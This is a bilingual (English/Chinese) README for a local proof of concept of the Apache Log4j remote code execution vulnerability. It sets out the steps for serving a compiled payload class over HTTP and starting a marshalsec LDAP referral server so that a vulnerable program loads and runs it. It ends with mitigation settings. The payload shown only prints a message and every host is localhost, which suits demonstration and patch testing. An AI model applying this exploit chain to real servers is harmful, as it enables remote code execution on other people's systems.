# Apache-Log4j
Apache Log4j 远程代码执行

> 攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响


### Steps
1. 【Important】***Move*** Log4jRCE.java to /home/remote/Log4jRCE.java, or any other directories except apache-log4j-poc.

2. Compile Log4jRCE.java and start http server
   1. `cd /home/remote`
   2. `javac Log4jRCE.java`
   3. start http server，python or php，`php -S 127.0.0.1:8888`

3. Start ldap server
   1. `git clone git@github.com:mbechler/marshalsec.git`
   2. `cd marshalsec`
   3. `mvn clean package -DskipTests`
   4. start ldap server `java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#Log4jRCE"`
   
4. Start log4j.java, then you can see `I am Log4jRCE from remote!!!`


### 触发步骤
1. 【重要】将Log4jRCE.java **挪出** 当前项目目录，比如挪到/home/remote/Log4jRCE.java，不然log4j.java运行时会读取到本地的Log4jRCE.java，就不走http远程下载了！

2. 编译Log4jRCE.java并启动http server
   1. 进入目录 `cd /home/remote`
   2. 编译 `javac Log4jRCE.java`
   3. 启动http server，python或php均可快速启动，如`php -S 127.0.0.1:8888`

3. 启动ldap server
   1. `git clone git@github.com:mbechler/marshalsec.git`
   2. `cd marshalsec`
   3. `mvn clean package -DskipTests`
   4. 启动ldap server `java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#Log4jRCE"`
4. 启动log4j.java，然后就会发现命令行出现了`I am Log4jRCE from remote!!!`。底层就是会远程下载Log4jRCE.class，然后执行newInstance()，所以会执行static、构造函数代码。

### 修复方案：

（1）修改jvm参数
-Dlog4j2.formatMsgNoLookups=true

（2）修改配置
在应用classpath下添加log4j2.component.properties配置文件，log4j2.formatMsgNoLookups=true
